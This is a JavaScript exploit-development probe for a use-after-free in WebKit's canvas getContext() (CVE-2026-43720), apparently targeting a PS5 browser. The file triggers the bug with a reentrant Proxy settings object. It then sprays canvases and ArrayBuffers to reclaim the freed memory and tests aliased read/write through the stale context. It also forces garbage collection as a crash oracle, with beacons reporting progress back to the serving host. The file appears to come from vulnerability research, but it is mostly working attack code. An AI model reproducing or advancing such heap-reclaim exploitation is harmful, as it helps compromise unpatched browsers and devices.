// fa-canvas-uaf — CVE-2026-43720 CanvasRenderingContext UAF via reentrant getContext()
//
// Writeup: docs/bugs/canvas-getcontext-uaf.md. HTMLCanvasElement::getContext()
// checks m_context at the top, then converts the settings dictionary — the
// conversion invokes our JS getters, which re-enter getContext() on the same
// canvas (inner call, no settings). The outer call then runs createContext2d(),
// whose unique_ptr assignment DESTROYS the inner context while its JS wrapper
// (innerCtx) is still alive. Any use of innerCtx, or its GC-sweep deref(),
// touches freed memory. Unpatched in WK-1400 (upstream fix 040ef6e21ffa,
// Safari 26.5.2 / WebKit Bugzilla 313175).
//
// PS5 caveat: freed memory stays mapped, so the bare trigger likely survives
// silently (same trap as CSSFontFace). The probe therefore:
//   R1  bare double-create + touch (mechanics + freed-but-mapped reads)
//   R2  same-class reclaim — 200 spray canvases with fresh 2D contexts;
//       innerCtx.canvas identity + lineWidth/fillStyle write-through = the
//       bidirectional aliased read/write signal (no crash needed)
//   R3  ArrayBuffer reclaim across size classes (0x41 fill) + heavy touch
//   R4  garbage reclaim + drop wrapper + GC pressure — sweep deref crash oracle
//   OS  OffscreenCanvas variant (if exposed), BR bitmaprenderer variant (if exposed)
//
// IMPORTANT: no XHR/beacon fires between the outer overwrite (the free) and
// the reclaim spray in R2 — XMLHttpRequest objects are FastMalloc'd and could
// steal the freed slot.
//
// Beacon prefix: VCAN-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = BASE + '/beacon/VCAN-' + tag + '?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 300));
      x.open('GET', u, true);
      x.send();
    } catch(e) {}
  }

  function B2(tag, body) { // image-channel fallback in case XHR is restricted
    try {
      var img = new Image();
      var u = BASE + '/beacon/VCAN-' + tag + '-IMG?t=' + Date.now();
      if (body) u += '&d=' + encodeURIComponent(String(body).substring(0, 200));
      img.src = u;
    } catch (e) {}
  }
  B('BOOT');
  B2('BOOT');

  // ── fingerprint ─────────────────────────────────────────────────────────
  var HAS_OFFSCREEN = typeof OffscreenCanvas !== 'undefined';
  var fpCanvas = document.createElement('canvas');
  var hasBR, hasWebGL;
  try { hasBR = !!fpCanvas.getContext('bitmaprenderer'); } catch (e) { hasBR = false; }
  try { hasWebGL = !!fpCanvas.getContext('webgl'); } catch (e) { hasWebGL = false; }
  fpCanvas = null;
  B('FP', 'offscreen=' + HAS_OFFSCREEN + ' br=' + hasBR + ' webgl=' + hasWebGL +
    ' ua=' + navigator.userAgent.replace(/\s+/g, ' ').substring(0, 80));

  // ── helpers ─────────────────────────────────────────────────────────────
  function strChurn(rounds) {
    // regression-test fallback GC pressure (JSC heap only, no FastMalloc reclaim)
    for (var r = 0; r < (rounds || 1); r++)
      for (var i = 0; i < 10000; i++) new String('abc' + i);
  }

  function gcPressureAsync(rounds, done) {
    var collected = false;
    var fr = null;
    try {
      fr = new FinalizationRegistry(function() { collected = true; });
      var sentinel = {};
      fr.register(sentinel, 's');
      sentinel = null;
    } catch (e) { fr = null; }
    var round = 0;
    function step() {
      for (var i = 0; i < 1000; i++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(round);
      round++;
      if (round < rounds) setTimeout(step, 30);
      else { B('GC-DONE' + (collected ? '-COLLECTED' : '')); done(); }
    }
    step();
  }

  // The trigger. Returns {canvas, outer, inner, via}. NO beacons inside: the
  // getter runs during dictionary conversion (before the free), which is
  // safe, but callers must stay silent between the return and their spray.
  // v2: Proxy-based settings — the first dictionary member this build converts
  // (whatever its name) fires the reentrant inner call. Run 1 showed only ONE
  // CanvasRenderingContext2DSettings member is converted on 14.20 (fired=1)
  // and it is not 'colorSpace', so member-named getters miss.
  function doubleCreate(useOffscreen) {
    var canvas, inner = null, calledInner = false, innerVia = null;
    if (useOffscreen) canvas = new OffscreenCanvas(8, 8);
    else canvas = document.createElement('canvas');
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (!calledInner && typeof prop === 'string' &&
            prop !== 'then' && prop !== 'toJSON') {
          calledInner = true;
          innerVia = prop;
          inner = canvas.getContext('2d');
        }
        return undefined; // every member takes its IDL default
      }
    });
    var outer = canvas.getContext('2d', settings);
    return { canvas: canvas, outer: outer, inner: inner, via: innerVia };
  }

  var AB_SIZES = [128, 160, 192, 224, 256, 288, 320, 352, 384, 416, 448,
                 480, 512, 576, 640, 704, 768, 896, 1024];

  function garbageSpray(perSize) {
    var abs = [];
    for (var si = 0; si < AB_SIZES.length; si++) {
      for (var c = 0; c < perSize; c++) {
        var ab = new ArrayBuffer(AB_SIZES[si]);
        var u8 = new Uint8Array(ab);
        for (var f = 0; f < u8.length; f++) u8[f] = 0x41;
        abs.push(ab);
      }
    }
    return abs;
  }

  // ── control: trigger shape WITHOUT reentrancy; NAME the converted members ──
  function roundControl(next) {
    var fired = [];
    var settings = new Proxy({}, {
      get: function(t, prop) {
        if (typeof prop === 'string' && fired.indexOf(prop) < 0 &&
            prop !== 'then' && prop !== 'toJSON')
          fired.push(prop);
        return undefined;
      }
    });
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d', settings);
    var fillOk = false, replaySame = false;
    try { ctx.fillRect(0, 0, 2, 2); fillOk = true; } catch (e) {}
    try { replaySame = (canvas.getContext('2d') === ctx); } catch (e) {}
    B('CONTROL', 'ctx=' + !!ctx + ' fired=[' + fired.join(',') + '] fillOk=' + fillOk +
      ' replaySame=' + replaySame);
    setTimeout(next, 300);
  }

  // ── R1: bare double-create, NO touch (mechanics only) ──────────────────
  // Run 2 showed the first stale-wrapper use (.canvas) kills the webview on a
  // fresh page, so R1 must not touch. The touch oracle is roundR1Touch at
  // the end of the plan.
  function roundR1(i, next) {
    var r = doubleCreate(false);
    B('R1-' + i + '-CREATE', 'inner=' + !!r.inner + ' outer=' + !!r.outer +
      ' same=' + (r.inner === r.outer) + ' via=' + r.via);
    if (r.inner && r.outer && r.inner !== r.outer) {
      var replay = 'X';
      try { replay = (r.canvas.getContext('2d') === r.outer); } catch (e) {}
      B('R1-' + i + '-REPLAY', String(replay));
    }
    B('R1-' + i + '-DONE');
    setTimeout(next, 300);
  }

  // ── R1 touch oracle: the deterministic crash from run 2 ────────────────
  function roundR1Touch(next) {
    var r = doubleCreate(false);
    B('R1T-CREATE', 'inner=' + !!r.inner + ' outer=' + !!r.outer + ' via=' + r.via);
    try { B('R1T-CANVAS', r.inner.canvas === r.canvas ? 'original' : 'other'); }
    catch (e) { B('R1T-CANVAS-X'); }
    try { r.inner.fillRect(0, 0, 2, 2); B('R1T-FILL-OK'); } catch (e) { B('R1T-FILL-X'); }
    B('R1T-SURVIVED');
    setTimeout(next, 300);
  }

  // ── R2: same-class reclaim — the aliasing round (FIRST phase: the page is
  // freshest here, and a successful reclaim makes the stale touch SAFE) ────
  function roundR2(i, next) {
    var N = 200;
    var sprayCanvases = [];
    for (var p = 0; p < N; p++) {
      var c = document.createElement('canvas');
      c.width = 8; c.height = 8;
      sprayCanvases.push(c);
    }
    var r = doubleCreate(false);
    // silent zone: free happened inside doubleCreate, spray immediately
    var sprayCtxs = [];
    for (var s = 0; s < N; s++) sprayCtxs.push(sprayCanvases[s].getContext('2d'));
    // capture identity BEFORE any beacon XHR can churn the heap
    var st = { inner: !!r.inner, outer: !!r.outer, via: r.via, ident: 'none', aliasIdx: -1 };
    try {
      if (r.inner) {
        var ic = r.inner.canvas;
        if (ic === r.canvas) st.ident = 'original';
        else {
          for (var k = 0; k < N; k++)
            if (ic === sprayCanvases[k]) { st.aliasIdx = k; st.ident = 'spray' + k; break; }
          if (st.aliasIdx < 0) st.ident = 'other';
        }
      } else st.ident = 'noinner';
    } catch (e) { st.ident = 'throw'; }
    B('R2-' + i + '-RESULT', 'inner=' + st.inner + ' outer=' + st.outer +
      ' via=' + st.via + ' ident=' + st.ident);
    if (!st.inner || !st.outer) { setTimeout(next, 300); return; }

    if (st.aliasIdx >= 0) {
      // write-through: stale wrapper -> spray context
      var wIdx = -1;
      try {
        r.inner.lineWidth = 66.5;
        for (var k2 = 0; k2 < N; k2++)
          if (sprayCtxs[k2].lineWidth === 66.5) { wIdx = k2; break; }
      } catch (e) { B('R2-' + i + '-WT-X'); }
      B('R2-' + i + '-WRITETHRU', wIdx >= 0 ? ('hit' + wIdx) : 'miss');
      // read-through: spray context -> stale wrapper
      if (wIdx >= 0) {
        try {
          sprayCtxs[wIdx].lineWidth = 42.5;
          B('R2-' + i + '-READTHRU', String(r.inner.lineWidth === 42.5));
        } catch (e) { B('R2-' + i + '-RT-X'); }
      }
    }
    B('R2-' + i + '-SURVIVED');
    setTimeout(next, 300);
  }

  // ── R3: garbage reclaim + heavy touch ───────────────────────────────────
  function roundR3(i, next) {
    var r = doubleCreate(false);
    var abs = garbageSpray(25);
    B('R3-' + i + '-SPRAY-DONE', 'n=' + abs.length);
    if (!r.inner) { B('R3-' + i + '-BAD'); setTimeout(next, 300); return; }
    try { var cv = r.inner.canvas; B('R3-' + i + '-CANVAS', cv === r.canvas ? 'original' : 'other'); }
    catch (e) { B('R3-' + i + '-CANVAS-X'); }
    try { r.inner.fillRect(0, 0, 4, 4); B('R3-' + i + '-FILL-OK'); } catch (e) { B('R3-' + i + '-FILL-X'); }
    try { B('R3-' + i + '-LW', String(r.inner.lineWidth)); } catch (e) { B('R3-' + i + '-LW-X'); }
    try { r.inner.strokeStyle = '#0ff'; B('R3-' + i + '-SS-OK'); } catch (e) { B('R3-' + i + '-SS-X'); }
    try { r.inner.lineTo(1, 1); r.inner.stroke(); B('R3-' + i + '-STROKE-OK'); } catch (e) { B('R3-' + i + '-STROKE-X'); }
    strChurn(2);
    B('R3-' + i + '-SURVIVED');
    setTimeout(next, 300);
  }

  // ── R4: sweep deref on reclaimed garbage — crash oracle ─────────────────
  function roundR4(i, next) {
    var r = doubleCreate(false);
    var abs = garbageSpray(25);
    B('R4-' + i + '-SPRAY-DONE', 'n=' + abs.length);
    // drop every reference to the stale wrapper, then force collections:
    // the wrapper sweep deref()s the freed context -> garbage m_canvas ->
    // wild refcount decrement. No SURVIVED beacon = crash in GC.
    r.inner = null; r.outer = null; r = null; abs = null;
    gcPressureAsync(30, function() {
      B('R4-' + i + '-SURVIVED');
      setTimeout(next, 300);
    });
  }

  // ── OffscreenCanvas variant (if exposed) ────────────────────────────────
  function roundOS(i, next) {
    if (!HAS_OFFSCREEN) { B('OS-SKIP'); setTimeout(next, 300); return; }
    var r;
    try { r = doubleCreate(true); } catch (e) { B('OS-' + i + '-CREATE-X', String(e).substring(0, 40)); setTimeout(next, 300); return; }
    if (!r.inner || !r.outer) { B('OS-' + i + '-BAD', 'inner=' + !!r.inner + ' outer=' + !!r.outer); setTimeout(next, 300); return; }
    B('OS-' + i + '-CREATE', 'same=' + (r.inner === r.outer));
    try { B('OS-' + i + '-CANVAS', r.inner.canvas ? 'ok' : 'null'); } catch (e) { B('OS-' + i + '-CANVAS-X'); }
    try { r.inner.fillRect(0, 0, 2, 2); B('OS-' + i + '-FILL-OK'); } catch (e) { B('OS-' + i + '-FILL-X'); }
    strChurn(1);
    B('OS-' + i + '-SURVIVED');
    setTimeout(next, 300);
  }

  // ── bitmaprenderer variant (if exposed) ─────────────────────────────────
  function roundBR(i, next) {
    if (!hasBR) { B('BR-SKIP'); setTimeout(next, 300); return; }
    var canvas = document.createElement('canvas');
    var inner = null, called = false;
    var settings = {
      get alpha() { if (!called) { called = true; inner = canvas.getContext('bitmaprenderer'); } return true; }
    };
    var outer = null;
    try { outer = canvas.getContext('bitmaprenderer', settings); } catch (e) { B('BR-' + i + '-X', String(e).substring(0, 30)); }
    B('BR-' + i + '-RESULT', 'inner=' + !!inner + ' outer=' + !!outer + ' same=' + (inner === outer));
    if (inner) {
      try { B('BR-' + i + '-CANVAS', inner.canvas === canvas ? 'original' : 'other'); } catch (e) { B('BR-' + i + '-CANVAS-X'); }
      try { inner.transferFromImageBitmap(null); B('BR-' + i + '-TF-OK'); } catch (e) { B('BR-' + i + '-TF-X'); }
    }
    strChurn(1);
    B('BR-' + i + '-SURVIVED');
    setTimeout(next, 300);
  }

  // ── run plan (R4-ONLY variant: sweep-deref oracle isolated from R3's touch-kill)
  // 3 fresh doubleCreate+drop+GC rounds; no CONTROL/R1/R2/R3/BR/OS.
  // BOOT/FP still fire at IIFE top. Silence after SPRAY-DONE = crash inside GC.
  var plan = [];
  for (var d = 1; d <= 3; d++) plan.push((function(n) { return function(next) { roundR4(n, next); }; })(d));

  B('PLAN', 'steps=' + plan.length);
  function run() {
    var step = plan.shift();
    if (!step) { B('DONE-ALL-SURVIVED'); return; }
    step(run);
  }
  setTimeout(run, 200);
})();
